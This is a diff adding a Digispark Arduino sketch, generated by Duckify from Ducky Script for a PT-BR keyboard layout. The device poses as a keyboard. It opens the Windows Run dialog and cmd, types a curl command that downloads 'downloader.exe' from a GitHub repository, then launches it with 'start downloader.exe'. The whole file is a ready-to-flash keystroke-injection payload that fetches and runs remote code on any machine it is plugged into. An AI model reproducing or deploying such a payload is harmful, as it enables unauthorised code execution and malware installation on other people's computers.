@@ -1,0 +1,64 @@
+// [ ===== Created using duckify.huhn.me @ dev 356a9805 ===== ] //
+// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
+// Please consider supporting us on ko-fi.com/spacehuhn <3
+// Learn more about us at spacehuhn.com
+
+// Platform: Digispark
+// Keyboard Layout: PT-BR
+
+#include "DigiKeyboard.h"
+
+// cmd
+const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
+// curl -L -o https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/downloader.exe
+const uint8_t key_arr_1[] PROGMEM = {0,6, 0,24, 0,21, 0,15, 0,44, 0,45, 2,15, 0,44, 0,45, 0,18, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,56, 64,20, 64,20, 0,10, 0,12, 0,23, 0,11, 0,24, 0,5, 0,55, 0,6, 0,18, 0,16, 64,20, 0,9, 0,8, 0,29, 0,4, 0,21, 0,18, 0,22, 0,4, 0,45, 0,7, 0,8, 0,25, 64,20, 0,8, 0,17, 0,23, 0,21, 0,8, 0,10, 0,4, 2,45, 0,8, 0,7, 0,24, 2,45, 0,9, 0,12, 0,22, 64,20, 0,21, 0,4, 0,26, 64,20, 0,16, 0,4, 0,12, 0,17, 64,20, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8};
+// start downloader.exe
+const uint8_t key_arr_2[] PROGMEM = {0,22, 0,23, 0,4, 0,21, 0,23, 0,44, 0,7, 0,18, 0,26, 0,17, 0,15, 0,18, 0,4, 0,7, 0,8, 0,21, 0,55, 0,8, 0,27, 0,8};
+
+void duckyString(const uint8_t* keys, size_t len) {  
+    for(size_t i=0; i<len; i+=2) {
+        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
+    }
+}
+
+void setup() {
+    pinMode(1, OUTPUT); // Enable LED
+    digitalWrite(1, LOW); // Turn LED off
+    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
+
+    digitalWrite(1, HIGH); // LED ON
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, LOW); // LED OFF
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, HIGH); // LED ON
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, LOW); // LED OFF
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, HIGH); // LED ON
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, LOW); // LED OFF
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, HIGH); // LED ON
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, LOW); // LED OFF
+    DigiKeyboard.delay(500); // DELAY 500
+    digitalWrite(1, HIGH); // LED ON
+    DigiKeyboard.sendKeyStroke(21, 8); // GUI R
+    DigiKeyboard.delay(500); // DELAY 500
+    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
+    DigiKeyboard.delay(500); // DELAY 500
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(700); // DELAY 700
+    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING curl -L -o https://github.com/fezarosa-...
+    DigiKeyboard.delay(500); // DELAY 500
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(700); // DELAY 700
+    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING start downloader.exe
+    DigiKeyboard.delay(500); // DELAY 500
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    digitalWrite(1, LOW); // LED OFF
+}
+
+void loop() {}
+
+// Created using duckify.huhn.me @ dev 356a9805
